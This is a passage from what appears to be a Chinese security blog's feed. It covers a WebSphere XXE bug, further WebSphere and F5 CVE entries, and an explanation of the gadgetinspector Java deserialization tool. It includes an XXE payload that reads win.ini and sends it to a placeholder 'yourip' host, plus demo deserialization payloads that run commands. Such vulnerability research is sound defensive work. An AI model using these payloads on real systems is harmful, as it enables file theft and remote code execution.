class="line">xml如下：</span><br><span class="line">&lt;!DOCTYPE x [</span><br><span class="line">  &lt;!ENTITY % aaa SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % bbb SYSTEM &quot;http://yourip:8000/xx.dtd&quot;&gt;</span><br><span class="line">  %bbb;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;definitions name=&quot;HelloService&quot; xmlns=&quot;http://schemas.xmlsoap.org/wsdl/&quot;&gt;</span><br><span class="line">  &amp;ddd;</span><br><span class="line">&lt;/definitions&gt;</span><br><span class="line"></span><br><span class="line">xx.dtd如下：</span><br><span class="line">&lt;!ENTITY % ccc &apos;&lt;!ENTITY ddd &amp;#39;&lt;import namespace=&quot;uri&quot; location=&quot;http://yourip:8000/xxeLog?%aaa;&quot;/&gt;&amp;#39;&gt;&apos;&gt;%ccc;</span><br></pre></td></tr></table></figure><p><img src="images/CVE-2020-4643/2.png" alt=""></p><h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>我们只看了浮在表面上的一些地方，人工最多只看了两层调用，也许RCE隐藏在更深的地方或者知识盲点现在没找到呢，还是得有个属于自己的能查找链的工具，工具不会累，人会。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote class=&quot;blockquote-center&quot;&gt;当你觉得很累的时候，说明你正在走上坡路。&lt;/blockquote&gt;

&lt;blockquote&gt;
&lt;p&gt;2020年9月17日，IBM发布了一个WebSphere XXE漏洞公告。 当时看到这个消息心想我们挖
      
    
    </summary>
    
      <category term="漏洞" scheme="http://longofo.cc/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞" scheme="http://longofo.cc/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Websphere IIOP远程代码执行漏洞(CVE-2020-4450)分析</title>
    <link href="http://longofo.cc/Websphere%20IIOP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2020-4450)%E5%88%86%E6%9E%90.html"/>
    <id>http://longofo.cc/Websphere IIOP远程代码执行漏洞(CVE-2020-4450)分析.html</id>
    <published>2020-07-28T06:17:32.000Z</published>
    <updated>2020-08-03T10:31:23.194Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">当你觉得很累的时候，说明你正在走上坡路。</blockquote><blockquote><p>已经有人先发了分析，就不再发了<br><img src="images/CVE-2020-4450/1.png" alt=""><br><img src="images/CVE-2020-4450/2.png" alt=""></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote class=&quot;blockquote-center&quot;&gt;当你觉得很累的时候，说明你正在走上坡路。&lt;/blockquote&gt;

&lt;blockquote&gt;
&lt;p&gt;已经有人先发了分析，就不再发了&lt;br&gt;&lt;img src=&quot;images/CVE-2020-4450/1
      
    
    </summary>
    
      <category term="漏洞" scheme="http://longofo.cc/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞" scheme="http://longofo.cc/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>F5 BIG-IP hsqldb踩坑分析(CVE-2020-5902)</title>
    <link href="http://longofo.cc/F5%20BIG-IP%20hsqldb%E8%B8%A9%E5%9D%91%E5%88%86%E6%9E%90(CVE-2020-5902).html"/>
    <id>http://longofo.cc/F5 BIG-IP hsqldb踩坑分析(CVE-2020-5902).html</id>
    <published>2020-07-10T08:44:37.000Z</published>
    <updated>2020-07-28T06:20:10.171Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">当你觉得很累的时候，说明你正在走上坡路。</blockquote><blockquote><p>已发布到paper.seebug，<a href="https://paper.seebug.org/1271/" target="_blank" rel="noopener">https://paper.seebug.org/1271/</a><br><img src="images/f5-big-ip/1.png" alt=""></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote class=&quot;blockquote-center&quot;&gt;当你觉得很累的时候，说明你正在走上坡路。&lt;/blockquote&gt;

&lt;blockquote&gt;
&lt;p&gt;已发布到paper.seebug，&lt;a href=&quot;https://paper.seebug.org/
      
    
    </summary>
    
      <category term="漏洞" scheme="http://longofo.cc/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞" scheme="http://longofo.cc/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="代码审计" scheme="http://longofo.cc/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化工具gadgetinspector原理初窥</title>
    <link href="http://longofo.cc/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7gadgetinspector%E5%8E%9F%E7%90%86%E5%88%9D%E7%AA%A5.html"/>
    <id>http://longofo.cc/Java反序列化工具gadgetinspector原理初窥.html</id>
    <published>2019-09-21T00:39:38.000Z</published>
    <updated>2019-11-28T07:50:27.690Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">当你觉得很累的时候，说明你正在走上坡路。</blockquote><blockquote><p>记录下自己初步研究gadgetinspector这个工具的一些东西吧</p></blockquote><a id="more"></a><h2 id="Java反序列化工具gadgetinspector初窥"><a href="#Java反序列化工具gadgetinspector初窥" class="headerlink" title="Java反序列化工具gadgetinspector初窥"></a>Java反序列化工具gadgetinspector初窥</h2><p><strong>作者：Longofo</strong></p><p><strong>时间：2019年9月4日</strong> </p><h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>一开始是听@Badcode师傅说的这个工具，在Black Hat 2018的一个议题提出来的。这是一个基于字节码静态分析的、利用已知技巧自动查找从source到sink的反序列化利用链工具。看了几遍作者在Black Hat上的<a href="https://www.youtube.com/watch?v=wPbW6zQ52w8" target="_blank" rel="noopener">演讲视频</a>与<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf" target="_blank" rel="noopener">PPT</a>，想从作者的演讲与PPT中获取更多关于这个工具的原理性的东西，可是有些地方真的很费解。不过作者开源了这个<a href="https://github.com/JackOfMostTrades/gadgetinspector" target="_blank" rel="noopener">工具</a>，但没有给出详细的说明文档，对这个工具的分析文章也很少，看到一篇平安集团对这个工具的<a href="https://mp.weixin.qq.com/s/RD90-78I7wRogdYdsB-UOg" target="_blank" rel="noopener">分析</a>，从文中描述来看，他们对这个工具应该有一定的认识并做了一些改进，但是在文章中对某些细节没有做过多的阐释。后面尝试了调试这个工具，大致理清了这个工具的工作原理，下面是对这个工具的分析过程，以及对未来工作与改进的设想。</p><h3 id="关于这个工具"><a href="#关于这个工具" class="headerlink" title="关于这个工具"></a>关于这个工具</h3><ul><li>这个工具不是用来寻找漏洞，而是利用已知的source-&gt;…-&gt;sink链或其相似特征发现分支利用链或新的利用链。</li><li>这个工具是在整个应用的classpath中寻找利用链。</li><li>这个工具进行了一些合理的预估风险判断（污点判断、污点传递等）。</li><li>这个工具会产生误报不是漏报（其实这里还是会漏报，这是作者使用的策略决定的，在后面的分析中可以看到）。</li><li>这个工具是基于字节码分析的，对于Java应用来说，很多时候我们并没有源码，而只有War包、Jar包或class文件。</li><li>这个工具不会生成能直接利用的Payload，具体的利用构造还需要人工参与。</li></ul><h3 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h3><p>序列化（Serialization）是将对象的状态信息转化为可以存储或者传输形式的过程，转化后的信息可以存储在磁盘上，在网络传输过程中，可以是字节、XML、JSON等格式；而将字节、XML、JSON等格式的信息还原成对象这个相反的过程称为反序列化。</p><p>在JAVA中，对象的序列化和反序列化被广泛的应用到RMI（远程方法调用）及网络传输中。</p><h3 id="Java中的序列化与反序列化库"><a href="#Java中的序列化与反序列化库" class="headerlink" title="Java中的序列化与反序列化库"></a>Java中的序列化与反序列化库</h3><ul><li>JDK(ObjectInputStream)</li><li>XStream(XML,JSON)</li><li>Jackson(XML,JSON)</li><li>Genson(JSON)</li><li>JSON-IO(JSON)</li><li>FlexSON(JSON)</li><li>Fastjson(JSON)</li><li>…</li></ul><p>不同的反序列化库在反序列化不同的类时有不同的行为、被反序列化类的不同”魔术方法”会被<strong>自动调用</strong>，这些被自动调用的方法就能够作为反序列化的入口点(source)。如果这些被自动调用的方法又调用了其他子方法，那么在调用链中某一个子方法也可以作为source，就相当于已知了调用链的前部分，从某个子方法开始寻找不同的分支。通过方法的层层调用，可能到达某些危险的方法(sink)。</p><ul><li><p>ObjectInputStream</p><p>例如某个类实现了Serializable接口，ObjectInputStream.readobject在反序列化类得到其对象时会自动查找这个类的readObject、readResolve等方法并调用。</p><p>例如某个类实现了Externalizable接口，ObjectInputStream.readobject在反序列化类得到其对象时会自动查找这个类的readExternal等方法并调用。</p></li><li><p>Jackson</p><p>ObjectMapper.readValue在反序列化类得到其对象时，会自动查找反序列化类的无参构造方法、包含一个基础类型参数的构造方法、属性的setter、属性的getter等方法并调用。</p></li><li><p>…</p></li></ul><p>在后面的分析中，都使用JDK自带的ObjectInputStream作为样例。</p><h3 id="控制数据类型-gt-控制代码"><a href="#控制数据类型-gt-控制代码" class="headerlink" title="控制数据类型=&gt;控制代码"></a>控制数据类型=&gt;控制代码</h3><p>作者说，在反序列化漏洞中，如果控制了数据类型，我们就控制了代码。这是什么意思呢？按我的理解，写了下面的一个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestDeserialization</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">interface</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">implements</span> <span class="title">Animal</span>,<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"cat eat fish"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">implements</span> <span class="title">Animal</span>,<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">"dog eat bone"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> Animal pet;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(Animal pet)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.pet = pet;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream stream)</span></span></span><br><span class="line"><span class="function">                <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">            pet = (Animal) stream.readObject();</span><br><span class="line">            pet.eat();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GeneratePayload</span><span class="params">(Object instance, String file)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//将构造好的payload序列化后写入文件中</span></span><br><span class="line">        File f = <span class="keyword">new</span> File(file);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">payloadTest</span><span class="params">(String file)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//读取写入的payload，并进行反序列化</span></span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(file));</span><br><span class="line">        Object obj = in.readObject();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Animal animal = <span class="keyword">new</span> Dog();</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(animal);</span><br><span class="line">        GeneratePayload(person,<span class="string">"test.ser"</span>);</span><br><span class="line">        payloadTest(<span class="string">"test.ser"</span>);</span><br><span class="line">        </span><br><span class="line"><span class="comment">//        Animal animal = new Cat();</span></span><br><span class="line"><span class="comment">//        Person person = new Person(animal);</span></span><br><span class="line"><span class="comment">//        GeneratePayload(person,"test.ser");</span></span><br><span class="line"><span class="comment">//        payloadTest("test.ser");</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了方便我把所有类写在一个类中进行测试。在Person中类中，有一个Animal类的属性pet，它是Cat和Dog的接口。在序列化时，我们能够控制Persion的pet具体是Cat对象或者Dog对象，因此在反序列化时，在readObject中<code>pet.eat()</code>具体的走向就不一样了。如果是pet是Cat类对象，就不会走到执行有害代码<code>Runtime.getRuntime().exec(&quot;calc&quot;);</code>这一步，但是如果pet是Dog类的对象，就会走到有害代码。</p><p>即使有时候类属性在声明时已经为它赋值了某个具体的对象，但是在Java中通过反射等方式依然能修改。如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">public class TestDeserialization &#123;</span><br><span class="line"></span><br><span class="line">    interface Animal &#123;</span><br><span class="line">        public void eat();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static class Cat implements Animal, Serializable &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void eat() &#123;</span><br><span class="line">            System.out.println(&quot;cat eat fish&quot;);</span><br><span class="line">        &#125;                           </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static class Dog implements Animal, Serializable &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void eat() &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(&quot;dog eat bone&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static class Person implements Serializable &#123;</span><br><span class="line">        private Animal pet = new Cat();</span><br><span class="line"></span><br><span class="line">        private void readObject(java.io.ObjectInputStream stream)</span><br><span class="line">                throws IOException, ClassNotFoundException &#123;</span><br><span class="line">            pet = (Animal) stream.readObject();</span><br><span class="line">            pet.eat();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void GeneratePayload(Object instance, String file)</span><br><span class="line">            throws Exception &#123;</span><br><span class="line">        //将构造好的payload序列化后写入文件中</span><br><span class="line">        File f = new File(file);</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void payloadTest(String file) throws Exception &#123;</span><br><span class="line">        //读取写入的payload，并进行反序列化</span><br><span class="line">        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));</span><br><span class="line">        Object obj = in.readObject();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Animal animal = new Dog();</span><br><span class="line">        Person person = new Person();</span><br><span class="line"></span><br><span class="line">        //通过反射修改私有属性</span><br><span class="line">        Field field = person.getClass().getDeclaredField(&quot;pet&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(person, animal);</span><br><span class="line"></span><br><span class="line">        GeneratePayload(person, &quot;test.ser&quot;);</span><br><span class="line">        payloadTest(&quot;test.ser&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Person类中，不能通过构造器或setter方法或其他方式对pet赋值，属性在声明时已经被定义为Cat类的对象，但是通过反射能将pet修改为Dog类的对象，因此在反序列化时依然会走到有害代码处。</p><p>这只是我自己对作者：”控制了数据类型，就控制了代码”的理解，在Java反序列化漏洞中，很多时候是利用到了Java的多态特性来控制代码走向最后达到恶意执行目的。</p><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p>在上面的例子中，能看到在反序列化时没有调用Person的readobject方法，它是ObjectInputStream在反序列化对象时自动调用的。作者将在反序列化中会自动调用的方法称为”魔术方法”。</p><p>使用ObjectInputStream反序列化时几个常见的魔术方法：</p><ul><li>Object.readObject()</li><li>Object.readResolve()</li><li>Object.finalize()</li><li>…</li></ul><p>一些可序列化的JDK类实现了上面这些方法并且还自动调用了其他方法（可以作为已知的入口点）：</p><ul><li>HashMap<ul><li>Object.hashCode()</li><li>Object.equals()</li></ul></li><li>PriorityQueue<ul><li>Comparator.compare()</li><li>Comparable.CompareTo()</li></ul></li><li>…</li></ul><p>一些sink：</p><ul><li>Runtime.exec()，这种最为简单直接，即直接在目标环境中执行命令</li><li>Method.invoke()，这种需要适当地选择方法和参数，通过反射执行Java方法</li><li>RMI/JNDI/JRMP等，通过引用远程对象，间接实现任意代码执行的效果</li><li>…</li></ul><p>作者给出了一个从Magic Methods(source)-&gt;Gadget Chains-&gt;Runtime.exec(sink)的例子：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/1.png" alt=""></p><p>上面的HashMap实现了readObject这个”魔术方法”，并且调用了hashCode方法。某些类为了比较对象之间是否相等会实现equals方法（一般是equals和hashCode方法同时实现）。从图中可以看到AbstractTableModel$ff19274a正好实现了hashCode方法，其中又调用了<code>f.invoke</code>方法，f是IFn对象，并且f能通过属性<code>__clojureFnMap</code>获取到。IFn是一个接口，上面说到，如果控制了数据类型，就控制了代码走向。所以如果我们在序列化时，在<code>__clojureFnMap</code>放置IFn接口的实现类FnCompose的一个对象，那么就能控制<code>f.invoke</code>走<code>FnCompose.invoke</code>方法，接着控制FnCompose.invoke中的f1、f2为FnConstant就能到达FnEval.invoke了（关于AbstractTableModel$ff19274a.hashcode中的<code>f.invoke</code>具体选择IFn的哪个实现类，根据后面对这个工具的测试以及对决策原理的分析，广度优先会选择短的路径，也就是选择了FnEval.invoke，所以这也是为什么要人为参与，在后面的样例分析中也可以看到）。</p><p>有了这条链，只需要找到触发这个链的漏洞点就行了。Payload使用JSON格式表示如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"@class"</span>:<span class="string">"java.util.HashMap"</span>,</span><br><span class="line">    <span class="attr">"members"</span>:[</span><br><span class="line">        <span class="number">2</span>,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"@class"</span>:<span class="string">"AbstractTableModel$ff19274a"</span>,</span><br><span class="line">            <span class="attr">"__clojureFnMap"</span>:&#123;</span><br><span class="line">                <span class="attr">"hashcode"</span>:&#123;</span><br><span class="line">                    <span class="attr">"@class"</span>:<span class="string">"FnCompose"</span>,</span><br><span class="line">                    "f1":&#123;"@class","FnConstant",value:"calc"&#125;,</span><br><span class="line">                    "f2":&#123;"@class":"FnEval"&#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="gadgetinspector工作流程"><a href="#gadgetinspector工作流程" class="headerlink" title="gadgetinspector工作流程"></a>gadgetinspector工作流程</h3><p>如作者所说，正好使用了五个步骤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 枚举全部类以及类的所有方法</span></span><br><span class="line"><span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">"classes.dat"</span>)) || !Files.exists(Paths.get(<span class="string">"methods.dat"</span>))</span><br><span class="line">        || !Files.exists(Paths.get(<span class="string">"inheritanceMap.dat"</span>))) &#123;</span><br><span class="line">    LOGGER.info(<span class="string">"Running method discovery..."</span>);</span><br><span class="line">    MethodDiscovery methodDiscovery = <span class="keyword">new</span> MethodDiscovery();</span><br><span class="line">    methodDiscovery.discover(classResourceEnumerator);</span><br><span class="line">    methodDiscovery.save();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//生成passthrough数据流</span></span><br><span class="line"><span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">"passthrough.dat"</span>))) &#123;</span><br><span class="line">    LOGGER.info(<span class="string">"Analyzing methods for passthrough dataflow..."</span>);</span><br><span class="line">    PassthroughDiscovery passthroughDiscovery = <span class="keyword">new</span> PassthroughDiscovery();</span><br><span class="line">    passthroughDiscovery.discover(classResourceEnumerator, config);</span><br><span class="line">    passthroughDiscovery.save();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//生成passthrough调用图</span></span><br><span class="line"><span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">"callgraph.dat"</span>))) &#123;</span><br><span class="line">    LOGGER.info(<span class="string">"Analyzing methods in order to build a call graph..."</span>);</span><br><span class="line">    CallGraphDiscovery callGraphDiscovery = <span class="keyword">new</span> CallGraphDiscovery();</span><br><span class="line">    callGraphDiscovery.discover(classResourceEnumerator, config);</span><br><span class="line">    callGraphDiscovery.save();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//搜索可用的source</span></span><br><span class="line"><span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">"sources.dat"</span>))) &#123;</span><br><span class="line">    LOGGER.info(<span class="string">"Discovering gadget chain source methods..."</span>);</span><br><span class="line">    SourceDiscovery sourceDiscovery = config.getSourceDiscovery();</span><br><span class="line">    sourceDiscovery.discover();</span><br><span class="line">    sourceDiscovery.save();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//搜索生成调用链</span></span><br><span class="line">&#123;</span><br><span class="line">    LOGGER.info(<span class="string">"Searching call graph for gadget chains..."</span>);</span><br><span class="line">    GadgetChainDiscovery gadgetChainDiscovery = <span class="keyword">new</span> GadgetChainDiscovery(config);</span><br><span class="line">    gadgetChainDiscovery.discover();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Step1-枚举全部类以及每个类的所有方法"><a href="#Step1-枚举全部类以及每个类的所有方法" class="headerlink" title="Step1 枚举全部类以及每个类的所有方法"></a>Step1 枚举全部类以及每个类的所有方法</h4><p>要进行调用链的搜索，首先得有所有类及所有类方法的相关信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodDiscovery</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(MethodDiscovery.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;ClassReference&gt; discoveredClasses = <span class="keyword">new</span> ArrayList&lt;&gt;();<span class="comment">//保存所有类信息</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> 